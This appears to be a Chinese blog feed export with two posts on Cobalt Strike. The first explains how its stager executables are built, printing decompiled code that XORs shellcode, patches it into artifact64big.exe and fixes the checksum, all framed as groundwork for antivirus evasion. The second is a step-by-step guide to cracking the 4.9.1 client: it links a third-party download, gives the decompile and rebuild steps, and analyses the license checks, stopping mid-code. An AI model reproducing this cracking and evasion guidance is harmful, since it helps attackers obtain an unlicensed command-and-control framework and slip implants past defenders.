class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"Patch加载器直接加载"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直接使用loader加载</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var8 <span class="token operator">&lt;</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// System.out.println("亦或的数字是: " +var6[var8 % 4]);</span>var7<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>var8 <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//亦或加密后到内存还原解密加载shellcode</span><span class="token punctuation">&#125;</span></code></pre><p>shellcode异或<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231048243.png" alt="shellcode异或"><br>shellcode亦或加密保存到var7 我们看亦或后的shellcode火绒杀不杀。亦或以后没反应<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231049836.png" alt="shellcode异或后不杀"><br>然后把填充artifact64big.exe 的A 填充shellcode。上面已经描述了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231050201.png" alt="异或后填充到A里面"><br>下图展示了shellcode亦或后添加了某些东西然后直接填充到指定为止<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231050220.png" alt="原来exe和填充后对比"></p><p>我们看shellcode异或后填充到artifact64big.exe<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231051996.png" alt="shellcode异或后填充到artifact64big.exe"></p><p>按道理我们可以执行这个填充了shellcode并且异或后的exe也可以直接执行只是没有修复sum<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231053635.png" alt="可以上线"></p><pre class="language-java" data-language="java"><code class="language-java">修复 sum<span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"fix checksum!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">return</span> var1<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"PEEditor fix checksum!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">PEEditor</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PEEditor</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            var2<span class="token punctuation">.</span><span class="token function">updateChecksum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"var1fixsum.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"fixchecsum.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> var2<span class="token punctuation">.</span><span class="token function">getImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"fixChecksum() failed for "</span> <span class="token operator">+</span> var1<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token string">" byte file. Skipping the checksum update"</span><span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> var1<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>a6ab8a95eacbb2890f2964902f7a5953   var1Nofixsum<span class="token punctuation">.</span>bin   没有fixchecksuma6ab8a95eacbb2890f2964902f7a5953   <span class="token class-name">Patchartifactx64shellcode</span>亦或后<span class="token number">3.</span>bin   可以直接运行a694ca2a7d3256100654cd2439b745cf   fixchecsum<span class="token punctuation">.</span>bin  fix checksuma694ca2a7d3256100654cd2439b745cf   artifact_x64<span class="token punctuation">.</span>exe  最终生成的exe</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231054985.png" alt="截图对比"><br>内存里面真正执行功能的点。所以这个会被杀<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231055858.png" alt="内存执行"><br>内存特征对比<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231055175.png" alt="我们看到内存里面的特征"><br>通过分析windows exe 我们知道 stager 提出出来可以直接加载类似这个<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231057695.png" alt="提取stage的raw文件"><br>shellcode执行<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231057077.png" alt="shellcode"><br>可以直接上线<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231039529.png" alt="自己加载shellcode"><br>我们看生成语言的发现没有没有raw的我们生成一下C语言的stage看看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231059503.png" alt="生成C语言stager"><br>我们发现大小都一样内容也一样。如此我们就得到通过windows exe 生成的由cs自带的exe加载shellcode。通过语言生成的shellcode由我们自己写的加载器加载shellcode。我们可以通过windows 生成exe模式得到raw的shellcode 直接使用加载器进行加载。我使用的c2profile 为默认的。下一次stageless的时候说一下为什么需要cs2profile 才能进行免杀。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231100024.png" alt="对比发现一样"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>cs windows可执行程序生成过程:<br>(1)resources&#x2F;httpsstager64.bin <br/><br>(2)把模板里面的Y和X分别替换成上线的ip的地址等<br/><br>(3)生成shellcode文件<br/><br>(4)把生成的shellcode通过异或以后<br/><br>(5)把异或后的shellcode放到artifact64big.exe 里面<br/><br>(6)然后修复一下sum<br/><br>(7)直接生成exe文件<br/><br>通过上述你要是杀软你肯定标记artifact64big.exe 把这个特征标记死了。静态特征。<br>所以这也就是如果你要做stage exe生成的免杀肯定要动artifact64big.exe 。下一期我们分析stageless生成原理也是通过windows exe生成stageless来分析。</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.9.1-客户端破解(一)</title>
      <link href="/penetrationtest/2025/01/articles/57e088d4a92e9e48/"/>
      <url>/penetrationtest/2025/01/articles/57e088d4a92e9e48/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们知道 CobaltStrike 在渗透测试中扮演着重要的角色。因此知道他的工作原理对于免杀来说至关重要。之前也有很多文章写CobaltStrike我个人认为大佬们对于新手来说写的不太详细导致有些java编程基础薄弱的可能看不太懂。大佬们觉得这些很简单但是对于新手来说是不可逾越的鸿沟。我通过互联网搜索关于CobaltStrike 4.9.1 破解文章较少。有的是付费的对于这个破解我想说收费也对毕竟要吃饭不知道付费的讲解如何。我站在我自己的角度会一步一步学习如何破解CobaltStrike 4.9.1 从0开始。前提是你必须有有一定的java编程基础否则你可能看不懂。<br>我们后续会对CobaltStrike进行进一步的剖析。我讲的在部分东西上有误或者有瑕疵希望大佬们轻喷。接下来开始吧。我们将CobaltStrike简称cs。</p><h2 id="下载原版cs并且解压"><a href="#下载原版cs并且解压" class="headerlink" title="下载原版cs并且解压"></a>下载原版cs并且解压</h2><p>我们从<a href="https://www.ddosi.org/cobalt-strike-4-9-1/%E4%B8%8B%E8%BD%BDcs%E5%8E%9F%E7%89%884.9.1">https://www.ddosi.org/cobalt-strike-4-9-1/下载cs原版4.9.1</a> 解压密码为: <a href="http://www.ddosi.org/">www.ddosi.org</a><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101111494.png" alt="cs原版本下载"><br>我们把cobaltstrike-4.9.1.-original.jar 解压如下图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101115965.png" alt="如下图"><br>其中cobaltstrike-client.jar 就是我们需要破解的客户端</p><h2 id="反编译源代码"><a href="#反编译源代码" class="headerlink" title="反编译源代码"></a>反编译源代码</h2><p>由于原版本没有进行混淆所以我们直接使用idea自带反编译器对jar包进行反编译我们创建一个cssource文件夹。把java-decompiler.jar 从idea里面拷贝出来放到和cssource同一目录<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101124010.png" alt="反编译jar"><br>我们来进行反编译。</p><pre class="language-sh" data-language="sh"><code class="language-sh">&quot;ieda安装目录\jbr\bin\java.exe&quot; -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs&#x3D;true cobaltstrike-client.jar cssource&#x2F;</code></pre><p>在反编译的开始会有停顿属于正常现象等着就行如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101130595.png" alt="反编译遇到停顿"><br>出现下图就算反编译结束了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101356587.png" alt="反编译结束"></p><h2 id="把反编译的源码和lib放到idea中"><a href="#把反编译的源码和lib放到idea中" class="headerlink" title="把反编译的源码和lib放到idea中"></a>把反编译的源码和lib放到idea中</h2><p>打开idea 点击File-New-project创建项目csproject<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101400662.png" alt="创建项目"><br>在项目中分别创建lib和DecompileSrc。lib copy到 cobaltstrike-client.jar。DecompileSrc cpoy到cobaltstrike-client.jar反编译后的.java文件<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101410734.png" alt="反编译后的文件"><br>在idea项目中放置如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101416434.png" alt="idea布局结构"></p><h2 id="部署运行环境"><a href="#部署运行环境" class="headerlink" title="部署运行环境"></a>部署运行环境</h2><p>1:给项目增加依赖<br/><br>点击-文件-项目结构-模块-依赖<br><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101421399.png" alt="如图"><br>然后在点击那个加号选择点击加号 jar或者是目录。选择lib包里面的cobaltstrike-client.jar<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101425078.png" alt="如图"><br>勾选然后点击应用(apply)然后点击ok<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101427213.png" alt="如图"></p><p>2:从反编译源码中复制主类类名添加依赖模块<br>我们从下图图片中得到主类为 aggressor.Aggressor<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101434768.png" alt="得到主类"><br> 选中Aggressor  按照如下图进行操作<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101438933.png" alt="复制"><br> 注意要复制到src里面<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101442391.png" alt="注意路径"></p><p> 3:配置jar包输出目录<br> 来到文件-项目结构-控件-加号-jar-来自模块依赖 如下图:<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101446972.png" alt="如图"><br>然后选择主类点击确定就行了。另外一个没截图默认就行了。<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101449262.png" alt="如图"><br>我们在主类中加入</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">"test!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>测试类<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101453702.png" alt="如图"><br>我们看主类的MANIFEST.MF缺少东西我们把反编译源码里面的MANIFEST.MF内容复制过来<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101456869.png" alt="如图"><br>复制过程就不截图了</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Ant</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token class-name">Apache</span> <span class="token class-name">Ant</span> <span class="token number">1.9</span><span class="token number">.15</span><span class="token class-name">Created</span><span class="token operator">-</span><span class="token class-name">By</span><span class="token operator">:</span> <span class="token number">1.7</span><span class="token number">.0_80</span><span class="token operator">-</span>b15 <span class="token punctuation">(</span><span class="token class-name">Oracle</span> <span class="token class-name">Corporation</span><span class="token punctuation">)</span><span class="token class-name">Main</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">aggressor<span class="token punctuation">.</span></span>Aggressor</span><span class="token class-name">Add</span><span class="token operator">-</span><span class="token class-name">Exports</span><span class="token operator">:</span> java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>swing java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>table java<span class="token punctuation">.</span>de sktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>plaf<span class="token punctuation">.</span>synth java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>java<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>plaf<span class="token punctuation">.</span>windows  java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>sun<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>shell java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>awt java<span class="token punctuation">.</span>base<span class="token operator">/</span>sun<span class="token punctuation">.</span>secu rity<span class="token punctuation">.</span>action<span class="token class-name">Add</span><span class="token operator">-</span><span class="token class-name">Opens</span><span class="token operator">:</span> java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>plaf<span class="token punctuation">.</span>synth java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span> plaf<span class="token punctuation">.</span>basic java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing java<span class="token punctuation">.</span>desktop<span class="token operator">/</span>javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span>tree java<span class="token punctuation">.</span> desktop<span class="token operator">/</span>java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token class-name">Synthetica</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">2.30</span><span class="token number">.0</span> <span class="token class-name">Build</span> <span class="token number">16</span><span class="token class-name">Multi</span><span class="token operator">-</span><span class="token class-name">Release</span><span class="token operator">:</span> <span class="token boolean">true</span></code></pre><p>来到build到build artifart 。build成功会生成jar文件<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101500459.png" alt="如图"><br>如图生成了jar文件。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101502243.png" alt="如图"><br>运行测试一下。点击run-编辑配置<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101505794.png" alt="配置"><br>点击加号-然后选择jar应用按照这么配置<br>空格 -XX:+AggressiveHeap -XX:+UseParallelGC 注意jdk要选择idea内置jdk<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101509808.png" alt="如图"><br>然后点击我们配置好的项目直接运行就行了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101513718.png" alt="如图"><br>出现下图这种说明环境没有问题程序运行了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101516779.png" alt="如图"></p><h2 id="分析并且破解cs客户端"><a href="#分析并且破解cs客户端" class="headerlink" title="分析并且破解cs客户端"></a>分析并且破解cs客户端</h2><p>我们从代码看Requirements.checkGUI();挨个函数进行分析<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101533577.png" alt="如图"><br>我们来看代码我把代码贴上来了</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkGUI</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token function">recommended</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//空函数</span>       <span class="token class-name">String</span> var0 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这个应该是判断环境的</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token class-name">String</span> var1 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"XDG_SESSION_TYPE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取环境配置</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"wayland"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_warn</span><span class="token punctuation">(</span><span class="token string">"You are using a Wayland desktop and not X11. Graphical Java applications run on Wayland are known to crash. You should use X11. See: https://www.cobaltstrike.com/help-wayland"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showInputDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"The Wayland desktop is not supported with Cobalt Strike.\nMore information:"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Icon</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"https://www.cobaltstrike.com/help-wayland"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       <span class="token class-name">Requirements</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Requirements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        var2<span class="token punctuation">.</span><span class="token function">initializeStarter</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">recommended</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//空函数</span>   <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"1.6"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.specification.version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"Java 1.6 is not supported. Please upgrade to Java 1.7 or later."</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>var0 <span class="token operator">&amp;&amp;</span> <span class="token string">"1.8"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.specification.version"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">isin</span><span class="token punctuation">(</span><span class="token string">"OpenJDK"</span><span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.runtime.name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"OpenJDK 1.8 is not supported. Use Oracle Java 8 or OpenJDK 11 (or later.)"</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token class-name">Set</span> var1 <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"-XX:+AggressiveHeap"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"Java -XX:+AggressiveHeap option not set. Use the Cobalt Strike launcher. Don't click the .jar file!"</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"-XX:+UseParallelGC"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">return</span> <span class="token string">"Java -XX:+UseParallelGC option not set. Use the Cobalt Strike launcher. Don't click the .jar file!"</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Set</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">RuntimeMXBean</span> var0 <span class="token operator">=</span> <span class="token class-name">ManagementFactory</span><span class="token punctuation">.</span><span class="token function">getRuntimeMXBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">List</span> var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getInputArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">HashSet</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> var2<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>上面分析没有发现有校验函数所以我们看这个Requirements类调用了一个initializeStarter函数并且传入class对象</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Requirements</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Requirements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  var2<span class="token punctuation">.</span><span class="token function">initializeStarter</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们重点看这个initializeStarter函数</p><pre class="language-java" data-language="java"><code class="language-java">  <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">initializeStarter</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//调用A函数进行校验操作</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token 